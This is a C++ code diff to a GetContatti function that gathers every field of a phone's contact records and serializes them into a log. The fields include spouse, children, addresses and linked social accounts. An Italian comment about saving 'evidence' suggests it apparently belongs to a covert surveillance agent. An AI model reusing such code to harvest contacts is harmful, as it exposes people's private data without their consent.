+			addNotes += L"Nickname=";
+			addNotes += contact.CompleteName.Nickname;
+			addNotes += L" ";
+		}
+
+		for (int k=0;k<contact.NumAccount;k++)
+		{
+			switch (contact.NameAccountKind[k])
+			{
+				case Phone:
+					addNotes += L"Phone";
+					break;
+				case WindowsLive:
+					addNotes += L"WindowsLive";
+					break;
+				case Outlook:
+					addNotes += L"Outlook";
+					break;
+				case Facebook:
+					addNotes += L"Facebook";
+					break;
+				case Other:
+					addNotes += L"Other";
+					break;
+				default:
+					continue;
+					break;
+			}
+			addNotes += L"=";
+			addNotes += contact.NameAccount[k];
+			addNotes += L" ";
+
+		}
+		addNotes += L"}";
+		
+		lpdwOutLength += _SerializedStringLength(addNotes.c_str());
+
 		
 		header.dwSize = lpdwOutLength;
 		lpOutBuf = new(std::nothrow) BYTE[lpdwOutLength];
 
 		if (lpOutBuf == NULL)
-			return NULL;
+			return;
 
 		pPtr = lpOutBuf;
 
@@ -1192,50 +782,51 @@ DWORD  GetContatti(void)
 		CopyMemory( pPtr, &header, sizeof(HeaderStruct));
 		pPtr += sizeof(HeaderStruct);
 
-		_SerializeString(&pPtr, contact.CompleteName.FirstName, FirstName << 0x18);
-		_SerializeString(&pPtr, contact.CompleteName.LastName, LastName << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_NAME, CompanyName << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_FAX_NUMBER, BusinessFaxNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL1_ADDRESS, Email1Address << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER, MobileTelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OFFICE_LOCATION, OfficeLocation << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_PAGER_NUMBER, PagerNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER, BusinessTelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_JOB_TITLE, JobTitle << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_TELEPHONE_NUMBER, HomeTelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL2_ADDRESS, Email2Address << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_SPOUSE, Spouse << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL3_ADDRESS, Email3Address << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER, Home2TelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_FAX_NUMBER, HomeFaxNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER, CarTelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_CHILDREN, Children << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_WEB_PAGE, WebPage << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER, Business2TelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER, RadioTelephoneNumber << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_YOMI_COMPANY, YomiCompanyName << 0x18);
-		_SerializeString(&pPtr, contact.CompleteName.YomiFirstName, YomiFirstName << 0x18);
-		_SerializeString(&pPtr, contact.CompleteName.YomiLastName, YomiLastName << 0x18);
-		_SerializeString(&pPtr, contact.CompleteName.Title, Title << 0x18);
-		_SerializeString(&pPtr, contact.CompleteName.MiddleName, MiddleName << 0x18);
-		_SerializeString(&pPtr, contact.CompleteName.Suffix, Suffix << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STREET, HomeAddressStreet << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_CITY, HomeAddressCity << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STATE, HomeAddressState << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE, HomeAddressPostalCode << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_COUNTRY, HomeAddressCountry << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STREET, OtherAddressStreet << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_CITY, OtherAddressCity << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE, OtherAddressPostalCode << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY, OtherAddressCountry << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STREET, BusinessAddressStreet << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_CITY, BusinessAddressCity << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STATE, BusinessAddressState << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE, BusinessAddressPostalCode << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY, BusinessAddressCountry << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE, OtherAddressState << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_FLOATING_BIRTHDAY, Birthday << 0x18);
-		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BODY_TEXT, Notes << 0x18);
+		_SerializeString(&pPtr, contact.CompleteName.FirstName, FirstName);
+		_SerializeString(&pPtr, contact.CompleteName.LastName, LastName);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_NAME, CompanyName);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_FAX_NUMBER, BusinessFaxNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL1_ADDRESS, Email1Address);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER, MobileTelephoneNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OFFICE_LOCATION, OfficeLocation);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_PAGER_NUMBER, PagerNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER, BusinessTelephoneNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_JOB_TITLE, JobTitle);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_TELEPHONE_NUMBER, HomeTelephoneNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL2_ADDRESS, Email2Address);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_SPOUSE, Spouse);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_EMAIL3_ADDRESS, Email3Address);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER, Home2TelephoneNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_FAX_NUMBER, HomeFaxNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER, TelephoneNumbers);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_CHILDREN, Children);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_WEB_PAGE, WebPage);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER, Business2TelephoneNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER, RadioTelephoneNumber);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_YOMI_COMPANY, YomiCompanyName);
+		_SerializeString(&pPtr, contact.CompleteName.YomiFirstName, YomiFirstName);
+		_SerializeString(&pPtr, contact.CompleteName.YomiLastName, YomiLastName);
+		_SerializeString(&pPtr, contact.CompleteName.Title, Title);
+		_SerializeString(&pPtr, contact.CompleteName.MiddleName, MiddleName);
+		_SerializeString(&pPtr, contact.CompleteName.Suffix, Suffix);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STREET, HomeAddressStreet);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_CITY, HomeAddressCity);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_STATE, HomeAddressState);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE, HomeAddressPostalCode);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_HOME_ADDRESS_COUNTRY, HomeAddressCountry);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STREET, OtherAddressStreet);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_CITY, OtherAddressCity);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE, OtherAddressPostalCode);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY, OtherAddressCountry);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STREET, BusinessAddressStreet);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_CITY, BusinessAddressCity);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_STATE, BusinessAddressState);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE, BusinessAddressPostalCode);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY, BusinessAddressCountry);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_OTHER_ADDRESS_STATE, OtherAddressState);
+		_SerializeString(&pPtr, contact.CONTACT_PIMPR_FLOATING_BIRTHDAY, Birthday);
+		//_SerializeString(&pPtr, contact.CONTACT_PIMPR_BODY_TEXT, Notes);
+		_SerializeString(&pPtr, addNotes.c_str(), Notes);
 
 
 		Log poomLog = Log();
@@ -1248,46 +839,6 @@ DWORD  GetContatti(void)
 		}
 
 		
-
-		/*
-		// Obtain dynamic entries length after serialization
-		for (ContactMapType::iterator it = pMap->begin(); it != pMap->end(); it++)
-		{
-			*lpdwOutLength += _SerializedStringLength(it->second);
-
-		}
-	
-		header.dwSize = *lpdwOutLength;
-
-		lpOutBuf = new(std::nothrow) BYTE[*lpdwOutLength];
-
-		if (lpOutBuf == NULL)
-			return NULL;
-
-		pPtr = lpOutBuf;
-
-		// Copy header
-		CopyMemory( pPtr, header, sizeof(HeaderStruct));
-		pPtr += sizeof(HeaderStruct);
-
-		// Serialize and copy strings
-		for (ContactMapType::iterator it =  pMap->begin(); it != pMap->end(); it++)
-		{
-			DWORD dwSerializedStringSize = _SerializeString(pPtr, it->second, (it->first) << 0x18);
-			pPtr += dwSerializedStringSize;
-		}
-
-		return lpOutBuf;
-
-		*/
-
-
-
-
-
-
-		//qui devo salvare le evidence
-
 
 
 /*
